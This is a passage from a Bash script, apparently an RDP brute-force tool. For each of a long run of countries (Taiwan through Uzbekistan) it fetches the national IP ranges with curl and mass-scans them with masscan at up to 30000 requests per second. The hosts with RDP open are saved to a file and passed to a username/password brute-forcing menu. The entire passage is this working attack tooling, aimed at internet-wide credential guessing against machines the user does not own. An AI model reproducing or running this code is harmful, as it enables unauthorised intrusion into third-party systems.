echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "179" ]; then
curl http://services.ce3c.be/ciprg/?countrys=TAIWAN%3B+REPUBLIC+OF+CHINA+%28ROC%29 |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Taiwan; Republic of China (ROC)://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "180" ]; then
curl http://services.ce3c.be/ciprg/?countrys=TAJIKISTAN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Tajikistan://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "181" ]; then
curl http://services.ce3c.be/ciprg/?countrys=TANZANIA+UNITED+REPUBLIC+OF |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Tanzania United Republic of://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "182" ]; then
curl http://services.ce3c.be/ciprg/?countrys=THAILAND |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Thailand://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "183" ]; then
curl http://services.ce3c.be/ciprg/?countrys=TOGO |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Togo://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "184" ]; then
curl http://services.ce3c.be/ciprg/?countrys=TONGA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Tonga://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "185" ]; then
curl http://services.ce3c.be/ciprg/?countrys=TRINIDAD+AND+TOBAGO |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Trinidad and Tobago://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "186" ]; then
curl http://services.ce3c.be/ciprg/?countrys=TUNISIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Tunisia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "187" ]; then
curl http://services.ce3c.be/ciprg/?countrys=TURKEY |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Turkey://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "188" ]; then
curl http://services.ce3c.be/ciprg/?countrys=TURKMENISTAN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Turkmenistan://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "189" ]; then
curl http://services.ce3c.be/ciprg/?countrys=TUVALU |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Tuvalu://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "190" ]; then
curl http://services.ce3c.be/ciprg/?countrys=UGANDA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Uganda://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "191" ]; then
curl http://services.ce3c.be/ciprg/?countrys=UKRAINE |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Ukraine://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "192" ]; then
curl http://services.ce3c.be/ciprg/?countrys=UNITED+ARAB+EMIRATES |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/United Arab Emirates://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "193" ]; then
curl http://services.ce3c.be/ciprg/?countrys=UNITED+KINGDOM |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/United Kingdom://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "194" ]; then
curl http://services.ce3c.be/ciprg/?countrys=UNITED+STATES |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/United States://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "195" ]; then
curl http://services.ce3c.be/ciprg/?countrys=URUGUAY |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Uruguay://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "196" ]; then
curl http://services.ce3c.be/ciprg/?countrys=UZBEKISTAN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Uzbekistan://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



